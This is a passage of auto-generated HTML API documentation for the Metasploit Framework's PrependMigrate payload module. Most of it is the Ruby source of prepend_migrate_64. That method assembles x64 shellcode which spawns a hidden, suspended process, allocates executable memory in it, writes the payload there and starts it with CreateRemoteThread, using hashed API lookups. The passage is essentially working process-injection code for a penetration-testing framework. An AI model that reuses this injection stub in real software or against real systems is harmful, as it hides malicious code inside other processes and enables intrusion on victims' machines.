    push </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>CreateRemoteThread</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'> ; hash( &quot;kernel32.dll&quot;, &quot;CreateRemoteThread&quot; )
    call ebp                  ; CreateRemoteThread( ...);

    </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_exitblock'>exitblock</span><span class='embexpr_end'>}</span><span class='tstring_content'>              ; jmp to exitfunc or long sleep

  getcommand:
    call gotcommand
    db &quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_procname'>procname</span><span class='embexpr_end'>}</span><span class='tstring_content'>&quot;
    db 0x00
  </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_block_close_to_payload'>block_close_to_payload</span><span class='embexpr_end'>}</span><span class='tstring_content'>
  begin_of_payload:
    call begin_of_payload_return
  payload:
</span><span class='heredoc_end'>  EOS
</span>  <span class='id identifier rubyid_migrate_asm'>migrate_asm</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="prepend_migrate?-instance_method">
  
    #<strong>prepend_migrate?</strong>  &#x21d2; <tt>Boolean</tt> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Returns the state of the PrependMigrate option See <a href="https://github.com/rapid7/metasploit-framework/pull/917">github.com/rapid7/metasploit-framework/pull/917</a> for discussion.</p>


  </div>
</div>
<div class="tags">
  
<p class="tag_title">Returns:</p>
<ul class="return">
  
    <li>
      
      
        <span class='type'>(<tt>Boolean</tt>)</span>
      
      
      
    </li>
  
</ul>

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


29
30
31</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/prepend_migrate.rb', line 29</span>

<span class='kw'>def</span> <span class='id identifier rubyid_prepend_migrate?'>prepend_migrate?</span>
  <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependMigrate</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="prepend_migrate_64-instance_method">
  
    #<strong>prepend_migrate_64</strong>(buf)  &#x21d2; <tt>Object</tt> 
  

  

  
</h3><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


231
232
233
234
235
236
237
238
239
240
241
242
243
244
245
246
247
248
249
250
251
252
253
254
255
256
257
258
259
260
261
262
263
264
265
266
267
268
269
270
271
272
273
274
275
276
277
278
279
280
281
282
283
284
285
286
287
288
289
290
291
292
293
294
295
296
297
298
299
300
301
302
303
304
305
306
307
308
309
310
311
312
313
314
315
316
317
318
319
320
321
322
323
324
325
326
327
328
329
330
331
332
333
334
335
336
337
338
339
340
341
342
343
344
345
346
347
348
349
350
351
352
353
354
355
356
357
358
359
360
361
362
363
364
365
366
367
368
369
370
371
372
373
374
375
376
377
378
379
380
381
382
383
384
385
386
387
388
389
390
391
392
393
394
395
396
397
398
399
400
401
402
403
404
405
406
407</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/prepend_migrate.rb', line 231</span>

<span class='kw'>def</span> <span class='id identifier rubyid_prepend_migrate_64'>prepend_migrate_64</span><span class='lparen'>(</span><span class='id identifier rubyid_buf'>buf</span><span class='rparen'>)</span>
  <span class='id identifier rubyid_payloadsize'>payloadsize</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>0x%04x</span><span class='tstring_end'>&quot;</span></span> <span class='op'>%</span> <span class='id identifier rubyid_buf'>buf</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span>
  <span class='id identifier rubyid_procname'>procname</span> <span class='op'>=</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependMigrateProc</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>rundll32</span><span class='tstring_end'>&#39;</span></span>

  <span class='comment'># Prepare instructions to get address of block_api into ebp
</span>  <span class='id identifier rubyid_block_api_start'>block_api_start</span> <span class='op'>=</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
<span class='tstring_content'>    call start
</span><span class='heredoc_end'>  EOS
</span>  <span class='id identifier rubyid_block_api_obj'>block_api_obj</span> <span class='op'>=</span> <span class='const'>Object</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='period'>.</span><span class='id identifier rubyid_extend'>extend</span><span class='lparen'>(</span><span class='const'><span class='object_link'><a href="../../../Msf.html" title="Msf (module)">Msf</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../Payload.html" title="Msf::Payload (class)">Payload</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../Windows.html" title="Msf::Payload::Windows (module)">Windows</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="BlockApi_x64.html" title="Msf::Payload::Windows::BlockApi_x64 (module)">BlockApi_x64</a></span></span><span class='rparen'>)</span>
  <span class='id identifier rubyid_block_api_asm'>block_api_asm</span> <span class='op'>=</span> <span class='id identifier rubyid_block_api_obj'>block_api_obj</span><span class='period'>.</span><span class='id identifier rubyid_asm_block_api'>asm_block_api</span>

  <span class='comment'># Prepare default exit block (sleep for a long long time)
</span>  <span class='id identifier rubyid_exitblock'>exitblock</span> <span class='op'>=</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
<span class='tstring_content'>    ;sleep
    xor rcx,rcx
    dec rcx                   ; rcx = -1
    mov r10d, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Sleep</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>      ; hash( &quot;kernel32.dll&quot;, &quot;Sleep&quot; )
    call rbp                  ; Sleep( ... );
</span><span class='heredoc_end'>  EOS
</span>
  <span class='id identifier rubyid_exitfunc_block_asm'>exitfunc_block_asm</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
  exitfunk:
    mov ebx, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>ExitThread</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>   ; The EXITFUNK as specified by user...
    mov r10d, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>GetVersion</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>  ; hash( &quot;kernel32.dll&quot;, &quot;GetVersion&quot; )
    call rbp              ; GetVersion(); (AL will = major version and AH will = minor version)
    add rsp, 40           ; cleanup the default param space on stack
    cmp al, 0x6           ; If we are not running on Windows Vista, 2008 or 7
    jl goodbye            ; Then just call the exit function...
    cmp bl, 0xE0          ; If we are trying a call to kernel32.dll!ExitThread on Windows Vista, 2008 or 7...
    jne goodbye           ;
    mov ebx, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>ntdll.dll</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>RtlExitUserThread</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>   ; Then we substitute the EXITFUNK to that of ntdll.dll!RtlExitUserThread
  goodbye:                ; We now perform the actual call to the exit function
    push 0x0              ;
    pop rcx               ; set the exit function parameter
    mov r10d, ebx         ; place the correct EXITFUNK into r10d
    call rbp              ; call EXITFUNK( 0 );
  </span><span class='tstring_end'>^</span></span>
  <span class='comment'># Check to see if we can find x64 exitfunc in the payload
</span>  
  <span class='id identifier rubyid_exitfunc_block_blob'>exitfunc_block_blob</span> <span class='op'>=</span> <span class='const'>Metasm</span><span class='op'>::</span><span class='const'>Shellcode</span><span class='period'>.</span><span class='id identifier rubyid_assemble'>assemble</span><span class='lparen'>(</span><span class='const'>Metasm</span><span class='op'>::</span><span class='const'>X64</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='comma'>,</span> <span class='id identifier rubyid_exitfunc_block_asm'>exitfunc_block_asm</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_encode_string'>encode_string</span>
  <span class='id identifier rubyid_exitfunc_index'>exitfunc_index</span> <span class='op'>=</span> <span class='id identifier rubyid_buf'>buf</span><span class='period'>.</span><span class='id identifier rubyid_index'>index</span><span class='lparen'>(</span><span class='id identifier rubyid_exitfunc_block_blob'>exitfunc_block_blob</span><span class='rparen'>)</span>
  <span class='kw'>if</span> <span class='id identifier rubyid_exitfunc_index'>exitfunc_index</span>
    <span class='id identifier rubyid_exitblock_offset'>exitblock_offset</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>0x%04x + payload - exitblock</span><span class='tstring_end'>&quot;</span></span> <span class='op'>%</span> <span class='lparen'>(</span><span class='id identifier rubyid_exitfunc_index'>exitfunc_index</span> <span class='op'>-</span> <span class='int'>5</span><span class='rparen'>)</span>
    <span class='id identifier rubyid_exitblock'>exitblock</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>exitblock:\njmp $+</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_exitblock_offset'>exitblock_offset</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
  <span class='kw'>end</span>

  <span class='id identifier rubyid_block_api_rbp_asm'>block_api_rbp_asm</span> <span class='op'>=</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
<span class='tstring_content'>    pop rbp                   ; Pop off the address of &#39;api_call&#39; for calling later.
</span><span class='heredoc_end'>  EOS
</span>  <span class='id identifier rubyid_block_close_to_payload'>block_close_to_payload</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>

  <span class='comment'># Check if we can find block_api in the payload
</span>  <span class='id identifier rubyid_block_api'>block_api</span> <span class='op'>=</span> <span class='const'>Metasm</span><span class='op'>::</span><span class='const'>Shellcode</span><span class='period'>.</span><span class='id identifier rubyid_assemble'>assemble</span><span class='lparen'>(</span><span class='const'>Metasm</span><span class='op'>::</span><span class='const'>X64</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='comma'>,</span> <span class='id identifier rubyid_block_api_asm'>block_api_asm</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_encode_string'>encode_string</span>
  <span class='id identifier rubyid_block_api_index'>block_api_index</span> <span class='op'>=</span> <span class='id identifier rubyid_buf'>buf</span><span class='period'>.</span><span class='id identifier rubyid_index'>index</span><span class='lparen'>(</span><span class='id identifier rubyid_block_api'>block_api</span><span class='rparen'>)</span>
  <span class='kw'>if</span> <span class='id identifier rubyid_block_api_index'>block_api_index</span>

    <span class='comment'># Prepare instructions to calculate address
</span>    <span class='id identifier rubyid_rbp_offset'>rbp_offset</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>0x%04x</span><span class='tstring_end'>&quot;</span></span> <span class='op'>%</span> <span class='lparen'>(</span><span class='id identifier rubyid_block_api_index'>block_api_index</span> <span class='op'>+</span> <span class='int'>5</span><span class='rparen'>)</span>
    <span class='id identifier rubyid_block_api_rbp_asm'>block_api_rbp_asm</span> <span class='op'>=</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
<span class='tstring_content'>      jmp close_to_payload
    return_from_close_to_payload:
      pop rbp
      add rbp, </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_rbp_offset'>rbp_offset</span><span class='embexpr_end'>}</span><span class='tstring_content'>
</span><span class='heredoc_end'>    EOS
</span>    <span class='comment'># Clear now-unneeded instructions
</span>    <span class='id identifier rubyid_block_api_asm'>block_api_asm</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
    <span class='id identifier rubyid_block_api_start'>block_api_start</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
    <span class='id identifier rubyid_block_close_to_payload'>block_close_to_payload</span> <span class='op'>=</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
<span class='tstring_content'>    close_to_payload:
      call return_from_close_to_payload
</span><span class='heredoc_end'>    EOS
</span>  <span class='kw'>end</span>

  <span class='comment'>#put all pieces together
</span>  <span class='id identifier rubyid_migrate_asm'>migrate_asm</span> <span class='op'>=</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
<span class='tstring_content'>    cld                       ; Clear the direction flag.
    </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_block_api_start'>block_api_start</span><span class='embexpr_end'>}</span><span class='tstring_content'>
    </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_block_api_asm'>block_api_asm</span><span class='embexpr_end'>}</span><span class='tstring_content'>
  start:
    </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_block_api_rbp_asm'>block_api_rbp_asm</span><span class='embexpr_end'>}</span><span class='tstring_content'>
    ; get our own startupinfo at esp+0x60
    add rsp,-400              ; adjust the stack to avoid corruption
    lea rcx,[rsp+0x30]
    mov r10d, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>GetStartupInfoA</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>       ; hash( &quot;kernel32.dll&quot;, &quot;GetStartupInfoA&quot; )
    call rbp                  ; GetStartupInfoA( &amp;si );

    jmp getcommand
  gotcommand:
    pop rsi                   ; rsi = address of process name (command line)

    ; create the process
    push 0                    ; keep the stack aligned
    lea rdi,[rsp+0x120]       ; Offset of empty space for lpProcessInformation
    push rdi                  ; lpProcessInformation : write processinfo here
    lea rcx,[rsp+0x60]
    push rcx                  ; lpStartupInfo : current info (read)
    xor rcx,rcx
    push rcx                  ; lpCurrentDirectory
    push rcx                  ; lpEnvironment
    push 0x08000004           ; dwCreationFlags CREATE_NO_WINDOW | CREATE_SUSPENDED
    push rcx                  ; bInHeritHandles
    mov r9, rcx               ; lpThreadAttributes
    mov r8, rcx               ; lpProcessAttributes
    mov rdx, rsi              ; lpCommandLine
    ; rcx is already zero     ; lpApplicationName
    mov r10d, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>CreateProcessA</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>      ; hash( &quot;kernel32.dll&quot;, &quot;CreateProcessA&quot; )
    call rbp                  ; CreateProcessA( &amp;si );

    ; if we didn&#39;t get a new process, use this one
    test rax,rax
    jz payload                ; If process creation failed, jump to shellcode

  goodProcess:
    ; allocate memory in the process (VirtualAllocEx())
    ; get handle
    push 0x40                 ; RWX
    mov r9,0x1000             ; 0x1000 = MEM_COMMIT
</span><span class='heredoc_end'>  EOS
</span>
  <span class='kw'>if</span> <span class='id identifier rubyid_buf'>buf</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span> <span class='op'>&gt;</span> <span class='int'>4096</span>
    <span class='comment'># probably stageless, so we don&#39;t have shellcode size constraints,
</span>    <span class='comment'># and so we can just set r8 to the size of the payload
</span>    <span class='id identifier rubyid_migrate_asm'>migrate_asm</span> <span class='op'>&lt;&lt;</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
<span class='tstring_content'>    mov r8, </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_payloadsize'>payloadsize</span><span class='embexpr_end'>}</span><span class='tstring_content'> ; stageless size
</span><span class='heredoc_end'>    EOS
</span>  <span class='kw'>else</span>
    <span class='comment'># otherwise we&#39;ll just reuse r9 (4096) for size
</span>    <span class='id identifier rubyid_migrate_asm'>migrate_asm</span> <span class='op'>&lt;&lt;</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
<span class='tstring_content'>    mov r8,r9                 ; size
</span><span class='heredoc_end'>    EOS
</span>  <span class='kw'>end</span>

  <span class='id identifier rubyid_migrate_asm'>migrate_asm</span> <span class='op'>&lt;&lt;</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
<span class='tstring_content'>    xor rdx,rdx               ; address
    mov rcx, [rdi]            ; handle
    mov r10d, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>VirtualAllocEx</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>       ; hash( &quot;kernel32.dll&quot;, &quot;VirtualAllocEx&quot; )
    call rbp                  ; VirtualAllocEx( ...);

    ; eax now contains the destination - save in ebx
    mov rbx, rax              ; lpBaseAddress
    ; WriteProcessMemory()
    push rsp                  ; lpNumberOfBytesWritten
    mov r9, </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_payloadsize'>payloadsize</span><span class='embexpr_end'>}</span><span class='tstring_content'>    ; nSize
    ; pick up pointer to shellcode &amp; keep it on stack
    jmp begin_of_payload
    begin_of_payload_return:
    pop r8                    ; lpBuffer
    mov rdx, rax              ; lpBaseAddress
    mov rcx, [rdi]            ; hProcess
    mov r10d, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>WriteProcessMemory</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>      ; hash( &quot;kernel32.dll&quot;, &quot;WriteProcessMemory&quot; )
    call rbp                  ; WriteProcessMemory( ...);

    ; run the code (CreateRemoteThread())
    xor rcx, rcx              ; rdx = 0
    push rcx                  ; lpthreadID
    push rcx                  ; run immediately
    push rcx                  ; no parameter
    mov r9,rbx                ; shellcode
    mov r8, rcx               ; stacksize
    ;rdx already equals 0     ; lpThreadAttributes
    mov rcx, [rdi]
    mov r10d, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>CreateRemoteThread</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>      ; hash( &quot;kernel32.dll&quot;, &quot;CreateRemoteThread&quot; )
    call rbp                  ; CreateRemoteThread( ...);

    </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_exitblock'>exitblock</span><span class='embexpr_end'>}</span><span class='tstring_content'>              ; jmp to exitfunc or long sleep

  getcommand:
    call gotcommand
    db &quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_procname'>procname</span><span class='embexpr_end'>}</span><span class='tstring_content'>&quot;
    db 0x00
  </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_block_close_to_payload'>block_close_to_payload</span><span class='embexpr_end'>}</span><span class='tstring_content'>
  begin_of_payload:
    call begin_of_payload_return
  payload:
</span><span class='heredoc_end'>  EOS
</span>  <span class='id identifier rubyid_migrate_asm'>migrate_asm</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
  </div>

</div>

      <div id="footer">
  Generated on Fri Oct 31 12:08:17 2025 by
  <a href="https://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
  0.9.37 (ruby-3.1.5).
</div>

    </div>
  </body>
</html>